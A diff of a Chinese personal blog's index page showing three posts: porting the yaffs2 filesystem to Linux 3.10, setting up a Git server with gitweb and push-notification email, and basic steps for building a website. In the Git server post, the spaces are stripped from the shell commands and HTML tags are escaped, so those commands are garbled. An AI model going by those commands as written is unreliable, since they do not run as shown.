+                <a class="post-title-link" href="/2013/11/02/基于linux-3-10的yaffs2移植/" itemprop="url">基于linux 3.10的yaffs2移植</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2013-11-02T13:07:41+08:00">
+                2013-11-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>最近想起来还有一块mini2440的开发板很久没有使用了，所以想移植一个基于linux3.10的linux系统，但是在移植yaffs2文件系统的时候出现了一些问题，我将其记录下来给其他同学解决同样的问题提供帮助。</p>
+<p>1. 首先通过git下载yaffs2代码。然后进入yaffs2文件夹中执行patch-ker.sh，给linux源代码打上patch。</p>
+<pre><code>$ git clone git://www.aleph1.co.uk/yaffs2
+$ cd yaffs2/
+$ ./patch-ker.sh c m ../linux3.10-mini2440`&lt;/pre&gt; 
+
+2\. 然后在linux的源代码fs中多了一个yaffs2的文件夹，到此yaffs2文件系统就已经添加到linux3.10中了。在Linux内核源代码根目录运行：make menuconfig，移动上下按键进行配置：
+
+&lt;pre&gt;`File Systems
+    ---&gt; Miscellaneous filesystems
+        ---&gt; [*]YAFFS2 file system support`&lt;/pre&gt; 并按空格选中它，这样我们就在内核中添加了yaffs2文件系统的支持，按“Exit”退出内核配置。 
+
+3\. 编译linux源代码。
+
+&lt;pre&gt;`$ make zImage
+scripts/kconfig/conf --silentoldconfig Kconfig
+  CHK     include/generated/uapi/linux/version.h
+  CHK     include/generated/utsrelease.h
+make[1]: `include/generated/mach-types.h&apos; is up to date.
+  CALL    scripts/checksyscalls.sh
+  CC      scripts/mod/devicetable-offsets.s
+  GEN     scripts/mod/devicetable-offsets.h
+  HOSTCC  scripts/mod/file2alias.o
+  HOSTLD  scripts/mod/modpost
+  CHK     include/generated/compile.h
+  CC      fs/yaffs2/yaffs_ecc.o
+  CC      fs/yaffs2/yaffs_vfs.o
+fs/yaffs2/yaffs_vfs.c: In function &apos;yaffs_proc_debug_write&apos;:
+fs/yaffs2/yaffs_vfs.c:3304: warning: comparison of distinct pointer types lacks a cast
+fs/yaffs2/yaffs_vfs.c: In function &apos;init_yaffs_fs&apos;:
+fs/yaffs2/yaffs_vfs.c:3398: error: implicit declaration of function &apos;create_proc_entry&apos;
+fs/yaffs2/yaffs_vfs.c:3399: warning: assignment makes pointer from integer without a cast
+fs/yaffs2/yaffs_vfs.c:3402: error: dereferencing pointer to incomplete type
+fs/yaffs2/yaffs_vfs.c:3403: error: dereferencing pointer to incomplete type
+fs/yaffs2/yaffs_vfs.c:3404: error: dereferencing pointer to incomplete type
+make[2]: *** [fs/yaffs2/yaffs_vfs.o] Error 1
+make[1]: *** [fs/yaffs2] Error 2
+make: *** [fs] Error 2`&lt;/pre&gt; 
+
+编译fs/yaffs2/yaffs_vfs.c时出现错误，function &apos;create_proc_entry&apos;没有申明。Google之后才知道原来这个接口在linux-3.10被删除了，应该使用proc_create代替。
+
+参考：[What&apos;s coming in 3.10, part 2](https://lwn.net/Articles/549737/)
+
+4\. 修改fs/yaffs2/yaffs_vfs.c
+
+&lt;pre&gt;`@@ -3384,12 +3384,6 @@ static struct file_system_to_install fs_to_install[] = {
+        {NULL, 0}
+ };
+
++static const struct file_operations yaffs_fops = {
++        .owner = THIS_MODULE,
++        .read = yaffs_proc_read,
++        .write = yaffs_proc_write,
++};
++
+ static int __init init_yaffs_fs(void)
+ {
+        int error = 0;
+@@ -3401,9 +3395,9 @@ static int __init init_yaffs_fs(void)
+        mutex_init(&amp;yaffs_context_lock);
+
+        /* Install the proc_fs entries */
++       my_proc_entry = proc_create(&quot;yaffs&quot;,
++                                         S_IRUGO | S_IFREG, YPROC_ROOT, &amp;yaffs_fops);
++#if 0
+-       my_proc_entry = create_proc_entry(&quot;yaffs&quot;,
+-                                         S_IRUGO | S_IFREG, YPROC_ROOT);
+-
+        if (my_proc_entry) {
+                my_proc_entry-&gt;write_proc = yaffs_proc_write;
+                my_proc_entry-&gt;read_proc = yaffs_proc_read;
+@@ -3411,7 +3405,7 @@ static int __init init_yaffs_fs(void)
+        } else {
+                return -ENOMEM;
+         }
++#endif
+-
+        /* Now add the file system entries */
+
+        fsinst = fs_to_install;`&lt;/pre&gt; 
+
+5\. 修改之后保存，然后再编译就可以成功了。
+
+&lt;pre&gt;`$ make zImage
+  CHK     include/generated/uapi/linux/version.h
+  CHK     include/generated/utsrelease.h
+make[1]: `include/generated/mach-types.h&apos; is up to date.
+  CALL    scripts/checksyscalls.sh
+  CC      scripts/mod/devicetable-offsets.s
+  GEN     scripts/mod/devicetable-offsets.h
+  HOSTCC  scripts/mod/file2alias.o
+  HOSTLD  scripts/mod/modpost
+  CHK     include/generated/compile.h
+  CC      fs/yaffs2/yaffs_vfs.o
+fs/yaffs2/yaffs_vfs.c: In function &apos;yaffs_proc_debug_write&apos;:
+fs/yaffs2/yaffs_vfs.c:3304: warning: comparison of distinct pointer types lacks a cast
+fs/yaffs2/yaffs_vfs.c: At top level:
+fs/yaffs2/yaffs_vfs.c:3389: warning: initialization from incompatible pointer type
+fs/yaffs2/yaffs_vfs.c:3390: warning: initialization from incompatible pointer type
+  CC      fs/yaffs2/yaffs_guts.o
+  CC      fs/yaffs2/yaffs_checkptrw.o
+  CC      fs/yaffs2/yaffs_packedtags1.o
+  CC      fs/yaffs2/yaffs_packedtags2.o
+  CC      fs/yaffs2/yaffs_nand.o
+  CC      fs/yaffs2/yaffs_tagscompat.o
+  CC      fs/yaffs2/yaffs_tagsmarshall.o
+  CC      fs/yaffs2/yaffs_mtdif.o
+  CC      fs/yaffs2/yaffs_nameval.o
+  CC      fs/yaffs2/yaffs_attribs.o
+  CC      fs/yaffs2/yaffs_allocator.o
+  CC      fs/yaffs2/yaffs_yaffs1.o
+  CC      fs/yaffs2/yaffs_yaffs2.o
+  CC      fs/yaffs2/yaffs_bitmap.o
+  CC      fs/yaffs2/yaffs_summary.o
+  CC      fs/yaffs2/yaffs_verify.o
+  LD      fs/yaffs2/yaffs.o
+  LD      fs/yaffs2/built-in.o
+  LD      fs/built-in.o
+  LINK    vmlinux
+  LD      vmlinux.o
+  MODPOST vmlinux.o
+  GEN     .version
+  CHK     include/generated/compile.h
+  UPD     include/generated/compile.h
+  CC      init/version.o
+  LD      init/built-in.o
+  KSYM    .tmp_kallsyms1.o
+  KSYM    .tmp_kallsyms2.o
+  LD      vmlinux
+  SORTEX  vmlinux
+  SYSMAP  System.map
+  OBJCOPY arch/arm/boot/Image
+  Kernel: arch/arm/boot/Image is ready
+  GZIP    arch/arm/boot/compressed/piggy.gzip
+  AS      arch/arm/boot/compressed/piggy.gzip.o
+  LD      arch/arm/boot/compressed/vmlinux
+  OBJCOPY arch/arm/boot/zImage
+  Kernel: arch/arm/boot/zImage is ready
+</code></pre>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://fengguoqing.github.io/2013/08/29/如何架设Git服务器/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Frank Feng">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Frank's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2013/08/29/如何架设Git服务器/" itemprop="url">如何架设Git服务器</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2013-08-29T10:49:10+08:00">
+                2013-08-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>在开发的过程中往往需要一个git服务器来管理和保存代码，如何自己架设一个git服务器呢，方法很简单，这里介绍一下如何架设git服务器，搭建gitweb和push代码之后发送邮件通知组内成员。</p>
+<h4 id="1-架设Git服务器"><a href="#1-架设Git服务器" class="headerlink" title="1. 架设Git服务器"></a>1. 架设Git服务器</h4><p>我们以Ubuntu为例。首先，在git服务器上创建一个名为 ‘git’ 的用户，并为其创建一个.ssh目录。并将其权限设置为仅git用户有读写权限 </p>
+<pre><code>$sudoaddusergit
+$sugit
+$cd
+$mkdir.ssh
+$chmod700.ssh`&lt;/pre&gt; 
+
+接下来，把开发者的 SSH 公钥添加到这个用户的authorized_keys文件中。假设你通过电邮收到了几个公钥并存到了临时文件里。重复一下，公钥大致看起来是这个样子：
+
+&lt;pre&gt;`$cat/tmp/id_rsa.john.pub
+ssh-rsaAAAAB3NzaC1yc2EAAAADAQABAAABAQCB007n/ww+ouN4gSLKssMxXnBOvf9LGt4L
+ojG6rs6hPB09j9R/T17/x4lhJA0F3FR1rP6kYBRsWj2aThGw6HXLm9/5zytK6Ztg3RPKK+4k
+Yjh6541NYsnEAZuXz0jTTyAUfrtU3Z5E003C4oxOj6H0rfIF1kKI9MAQLMdpGW1GYEIgS9Ez
+Sdfd8AcCIicTDWbqLAcU4UpkaX8KyGlLwsNuuGztobF8m72ALC/nLF6JLtPofwFBlgc+myiv
+O7TCUSBdLQlgMVOFq1I2uPWQOkOWQAHukEOmfjy2jctxSDBQ220ymjaNsHT4kgtZg2AYYgPq
+dAv8JggJICUvax2T9va5gsg-keypair`&lt;/pre&gt; 
+
+只要把它们逐个追加到authorized_keys文件尾部即可，同时将authorized_keys设置为仅git用户有读写权限。
+
+&lt;pre&gt;`$cat/tmp/id_rsa.john.pub&gt;&gt;~/.ssh/authorized_keys
+$cat/tmp/id_rsa.josie.pub&gt;&gt;~/.ssh/authorized_keys
+$cat/tmp/id_rsa.jessica.pub&gt;&gt;~/.ssh/authorized_keys
+$chmod600~/.ssh/authorized_keys`&lt;/pre&gt; 
+
+现在可以用--bare选项运行git init来建立一个裸仓库，这会初始化一个不包含工作目录的仓库。
+
+&lt;pre&gt;`$cd/opt/git
+$mkdirproject.git
+$cdproject.git
+$git--bareinit`&lt;/pre&gt; 
+
+这时，Join，Josie 或者 Jessica 就可以把它加为远程仓库，推送一个分支，从而把第一个版本的项目文件上传到仓库里了。值得注意的是，每次添加一个新项目都需要通过 shell 登入主机并创建一个裸仓库目录。我们不妨以gitserver作为git用户及项目仓库所在的主机名。如果在网络内部运行该主机，并在 DNS 中设定gitserver指向该主机，那么以下这些命令都是可用的：
+
+&lt;pre&gt;`#在John的电脑上
+$cdmyproject
+$gitinit
+$gitadd.
+$gitcommit-m&apos;initialcommit&apos;
+$gitremoteaddorigingit@gitserver:/opt/git/project.git
+$gitpushoriginmaster`&lt;/pre&gt; 
+
+这样，其他人的克隆和推送也一样变得很简单：
+
+&lt;pre&gt;`$gitclonegit@gitserver:/opt/git/project.git
+$vimREADME
+$gitcommit-am&apos;fixfortheREADMEfile&apos;
+$gitpushoriginmaster`&lt;/pre&gt; 
+
+用这个方法可以很快捷地为少数几个开发者架设一个可读写的 Git 服务。
+
+作为一个额外的防范措施，你可以用 Git 自带的git-shell工具限制git用户的活动范围。只要把它设为git用户登入的 shell，那么该用户就无法使用普通的 bash 或者 csh 什么的 shell 程序。编辑/etc/passwd文件：
+
+&lt;pre&gt;`$sudovim/etc/passwd`&lt;/pre&gt; 
+
+在文件末尾，你应该能找到类似这样的行：
+
+&lt;pre&gt;`git:x:1000:1000::/home/git:/bin/sh`&lt;/pre&gt; 
+
+把bin/sh改为/usr/bin/git-shell（或者用which git-shell查看它的实际安装路径）。该行修改后的样子如下：
+
+&lt;pre&gt;`git:x:1000:1000::/home/git:/usr/bin/git-shell`&lt;/pre&gt; 
+
+现在git用户只能用 SSH 连接来推送和获取 Git 仓库，而不能直接使用主机 shell。尝试普通 SSH 登录的话，会看到下面这样的拒绝信息：
+
+&lt;pre&gt;`$sshgit@gitserver
+fatal:WhatdoyouthinkIam?Ashell?
+Connectiontogitserverclosed.`&lt;/pre&gt; 
+
+这里提供的方法，组内所有成员对project都有读写权限，也就是说每个分支都可以push代码，如果需要更加细致的权限控制，请使用[Gitosis](http://git-scm.com/book/zh/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84-Git-Gitosis)或者[Gitolite](http://git-scm.com/book/zh/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84-Git-Gitolite)。
+
+&lt;span id=&quot;OSC_h4_2&quot;&gt;&lt;/span&gt;
+
+#### 2\. 搭建Gitweb
+
+安装gitweb之后就可以通过网站访问我们的项目了。就像&lt;span style=&quot;font-family: Courier,monospace; font-size: 14px; line-height: 18px;&quot;&gt;[http://git.kernel.org](http://git.kernel.org)一样显示了&lt;/span&gt; 
+
+首先需要安装Gitweb，如果没有安装apache，那么直接安装Gitweb，也会将apache2安装的。
+
+&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`$sudoapt-getinstallgitwebapache2`&lt;/pre&gt; 
+
+安装完成之后，我们只需要修改一下配置文件，将/etc/gitweb.conf文件中的$projectroot修改为放工程文件的目录。
+
+&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`$vim/etc/gitweb.conf
+#pathtogitprojects(&lt;project&gt;.git)
+$projectroot=&quot;/opt/git&quot;;`&lt;/pre&gt; 
+
+至此gitweb就可以使用了，现在可以通过http://[git_server_IP]/gitweb访问了。
+
+&lt;span id=&quot;OSC_h4_3&quot;&gt;&lt;/span&gt;
+
+#### 3\. Push之后发送邮件通知
+
+当组内成员push代码到服务器上之后，会自动发送邮件通知组内所有人员，该次push的具体内容是什么。具体配置方法：
+
+一般在安装Git的时候发送邮件的脚本/usr/share/git-core/contrib/hooks/post-receive-email已经存在了，首先要修改所有者和执行权限，并且安装sendmail。
+
+&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`$sudochowngit:gitpost-receive-email
+$sudochmod755post-receive-email
+$sudoapt-getinstallsendmail`&lt;/pre&gt; 
+
+然后到切换到工程目录下的hooks中，添加 post-receive软链接指向 /usr/share/git-core/contrib/hooks/ post-receive-email。
+
+&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`$cd/opt/git/project.git/hooks
+$ln-s/usr/share/git-core/contrib/hooks/post-receive-emailpost-receive`&lt;/pre&gt; 
+
+最后修改工程目录中的config文件即可。mailinglist是邮件列表， &lt;span style=&quot;line-height: 1.5; font-size: 10pt;&quot;&gt;envelopesender是发件人的邮箱，&lt;/span&gt; 
+
+&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`$vim/opt/git/project.git/config
+[core]
+repositoryformatversion=0
+filemode=true
+bare=true
+
+[hooks]
+mailinglist=&quot;example@gmail.com,example2@gmail.com&quot;#收件人列表
+envelopesender=project.git@example.com#送件人地址
+emailprefix=&quot;[Projectcommit]&quot;#邮件标题前缀
+showrev=&quot;gitshow-C%s;echo&quot;#不只显示有变化的文件，同时也显示改变的内容`&lt;/pre&gt; 
+
+为了使邮件显示的更清楚，还要修改一下工程目录当中的description文件，在description文件中，默认第一行是项目名称，所以要在第一行填入该项目的名称，这个在邮件中会有显示。
+
+&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`$vim/opt/git/project.git/description
+Project_A`&lt;/pre&gt; 
+
+我们收到邮件的标题是这样的：
+
+&lt;pre class=&quot;brush:html; toolbar: true; auto-links: false;&quot;&gt;`[Projectcommit]Project_Abranchmasterupdated.8811b83e1afb373cbe30d5bc25683d74ace2917c`&lt;/pre&gt; 
+
+有时候我们会发现启动和发送sendmail都相当慢，甚至要等两三分钟，完全不能忍，最后通过不断的测试，解决了这个问题，主要是要修改/etc/hosts。例如我的发件人的域是example.com，hostname是desktop，那么就应该这样修改：
+
+&lt;pre class=&quot;brush:xml;toolbar: true; auto-links: false;&quot;&gt;`127.0.0.1example.comlocalhostdesktop`&lt;/pre&gt; 
+
+改完之后重启sendmail服务:
+
+&lt;pre class=&quot;brush:shell;toolbar: true; auto-links: false;&quot;&gt;`servicesendmailrestart
+</code></pre><p>然后你就会发现邮件发的那是刷刷滴！</p>
+<p>至此，我们的Git服务器就已经搭建完成了，和你的小伙伴一起快乐的coding吧！</p>
+<p><span id="OSC_h4_4"></span></p>
+<h4 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4. 参考链接"></a>4. 参考链接</h4><p><a href="http://git-scm.com/book/zh/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84-Git-%E6%9E%B6%E8%AE%BE%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank" rel="noopener">http://git-scm.com/book/zh/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84-Git-%E6%9E%B6%E8%AE%BE%E6%9C%8D%E5%8A%A1%E5%99%A8</a> </p>
+<p><a href="http://josephj.com/entry.php?id=346" target="_blank" rel="noopener">http://josephj.com/entry.php?id=346</a> </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://fengguoqing.github.io/2013/06/22/建立网站的一般步骤/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Frank Feng">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Frank's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2013/06/22/建立网站的一般步骤/" itemprop="url">建立网站的一般步骤</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2013-06-22T20:22:22+08:00">
+                2013-06-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>前一段时间在学习怎么建立一个属于自己的网站，现在将这个过程分享给大家，其实建立网站也是很简单的。</p>
+<p><span id="OSC_h3_1"></span></p>
+<h3 id="1-申请域名"><a href="#1-申请域名" class="headerlink" title="1. 申请域名"></a>1. 申请域名</h3><p> 域名就是你网站的网址，取一个比较简洁易记有意义的域名，然后到<a href="https://mya.godaddy.com/" target="_blank" rel="noopener">https://mya.godaddy.com/</a>上注册一个账号，就可以在上面申请属于你的域名了。申请顶级域名是需要付费的，一般价格如下表所示，也有部分比较好的域名价格很贵。如果你无法直接在该网站购买域名，那么你先挑选好域名之后到淘宝上请别人帮你购买。</p>
+<p><a href="http://static.oschina.net/uploads/img/201306/22202218_SPHf.png" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201306/22202219_Z1xc.png" alt="image" title="image"></a></p>
+<p><span id="OSC_h3_2"></span></p>
+<h3 id="2-空间"><a href="#2-空间" class="headerlink" title="2. 空间"></a>2. 空间</h3><p> 空间就是放置网站代码和数据的地方。可以到淘宝上买空间，国外的空间访问可能会比较慢，最好买香港的空间，这样就不需要备案，买空间的时候注意该空间支持的服务器脚本语言，数据库，以及空间大小和数据库大小。 可以先买一个小空间（比如100M）用着，以后比较熟悉了再换。</p>
+<p><a href="http://static.oschina.net/uploads/img/201306/22202219_cWa9.png" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201306/22202220_sK8S.png" alt="image" title="image"></a></p>
+<h3 id="3-CMS"><a href="#3-CMS" class="headerlink" title="3. CMS"></a>3. CMS</h3><p> 利用CMS可以帮你快速建立网站，推荐的CMS有：<a href="http://www.phome.net/" target="_blank" rel="noopener">帝国CMS</a>，<a href="https://cn.wordpress.org/" target="_blank" rel="noopener">Wordpress</a>，<a href="http://www.dedecms.com/" target="_blank" rel="noopener">织梦CMS</a>，<a href="https://drupal.org/home" target="_blank" rel="noopener">Drupal</a>等，建议先安装帝国CMS，因为它会帮你直接将apache和php5安装。如果你要建立个人博客网站，那么<a href="https://cn.wordpress.org/" target="_blank" rel="noopener">Wordpress</a>是一个不错的选择。</p>
+<p><a href="http://static.oschina.net/uploads/img/201306/22202423_9znZ.png" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201306/22202423_NfFT.png" alt="image" title="image"></a><br> 帝国CMS安装目录<br><a href="http://static.oschina.net/uploads/img/201306/22202423_xfyb.png" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201306/22202424_feG4.png" alt="image" title="image"></a><br> Wordpress后台管理界面</p>
+<h3 id="4-上传网站代码"><a href="#4-上传网站代码" class="headerlink" title="4. 上传网站代码"></a>4. 上传网站代码</h3><p> 利用FTP上传利器filezilla将网站代码上传到刚刚购买的空间中。FTP的地址账号密码会在买空间时提供给你。</p>
+<h3 id="5-空间和域名绑定"><a href="#5-空间和域名绑定" class="headerlink" title="5. 空间和域名绑定"></a>5. 空间和域名绑定</h3><p> 将我们申请的域名和空间绑定，也就是DNS解析。具体过程可以参考下面这片文章： <a href="http://www.yidaomi.com/godaddy/7.html" target="_blank" rel="noopener">http://www.yidaomi.com/godaddy/7.html</a>，一段时间之后你就可以在浏览器中通过域名就可以访问你的网站了。</p>
+<h3 id="6-安装网站"><a href="#6-安装网站" class="headerlink" title="6. 安装网站"></a>6. 安装网站</h3><p> 访问你的网站，按照提示一步一步安装你的网站。最后大功告成，一个属于你网站就建成了。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+  </section>
+
+  
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Frank Feng</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Frank Feng</span>
+
+  
 </div>
-</body>
-<script src="//cdnjs.cloudflare.com/ajax/libs/jquery.pjax/1.9.6/jquery.pjax.min.js"></script>
-<script src="/js/script.js"></script>
-<script>
-    /*作者、标签的自动补全*/
-    $(function () {
-        $('.search').AutoComplete({
-            'data': ['#功耗','#linux移植','#日常记录','#教程','#linux CVE-2013-1763 漏洞','#redmine','#系统安全','#Linux内核调试','#ACPI',],
-            'itemHeight': 20,
-            'width': 418
-        }).AutoComplete('show');
-    })
-    function initArticle() {
-        /*渲染对应的表格样式*/
-        
-            $(".post .pjax table").addClass("green_title");
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
         
 
-        /*渲染打赏样式*/
-        
-        $("input[name=pay]").on("click", function () {
-            if($("input[name=pay]:checked").val()=="weixin"){
-                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
-            } else {
-                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
-            }
-        })
-        
 
-        /*高亮代码块行号*/
-        
-        $('pre code').each(function(){
-            var lines = $(this).text().split('\n').length - 1;
-            var $numbering = $('<ul/>').addClass('pre-numbering').attr("unselectable","on");
-            $(this).addClass('has-numbering')
-                    .parent()
-                    .append($numbering);
-            for(i=1;i<=lines;i++){
-                $numbering.append($('<li/>').text(i));
-            }
-        });
-        
 
-        /*访问数量*/
-        
-        $.getScript("//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js");
-        
 
-        /*代码高亮，行号对齐*/
-        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
-    }
 
-    /*打赏页面隐藏与展示*/
+
+
+        
+      </div>
+    </footer>
+
     
-    function dashangToggle() {
-        $(".shang_box").fadeToggle();
-        $(".hide_box").fadeToggle();
-    }
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
     
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
 </script>
 
-<!--加入行号的高亮代码块样式-->
 
-<style>
-    pre{
-        position: relative;
-        margin-bottom: 24px;
-        border-radius: 10px;
-        border: 2px solid #e2dede;
-        background: #FFF;
-        overflow: hidden;
-    }
-    code.has-numbering{
-        margin-left: 30px;
-    }
-    .pre-numbering{
-        margin: 0px;
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 20px;
-        padding: 0.5em 3px 0.7em 5px;
-        border-right: 1px solid #C3CCD0;
-        text-align: right;
-        color: #AAA;
-        background-color: ;
-    }
-</style>
 
-<!--自定义样式设置-->
-<style>
-    
-    .nav-right nav a.hover{
-        background-color: #e2e0e0;
-    }
-    
-    
 
-    /*列表样式*/
-    
-    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
-        border: #e2dede solid 2px;
-        border-radius: 10px;
-        padding: 10px 32px 10px 56px;
-    }
-    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
-        padding-top: 5px;
-        padding-bottom: 5px;
-    }
-    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
-        margin-bottom: auto;
-        margin-left: auto;
-    }
-    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
-        margin-bottom: auto;
-        margin-left: auto;
-    }
-    
 
-    /*引用块样式*/
-    
 
-    /*文章列表背景图*/
-    
-    .nav-right:before {
-        content: ' ';
-        display: block;
-        position: absolute;
-        left: 0;
-        top: 0;
-        width: 100%;
-        height: 100%;
-        opacity: 0.1;
-        background: url("http://oncj6b2vl.bkt.clouddn.com/FlSExUGfRSaqxkK5v42CpuI-tXAL.jpg");
-        background-repeat: no-repeat;
-        background-position: 50% 0;
-        -ms-background-size: cover;
-        -o-background-size: cover;
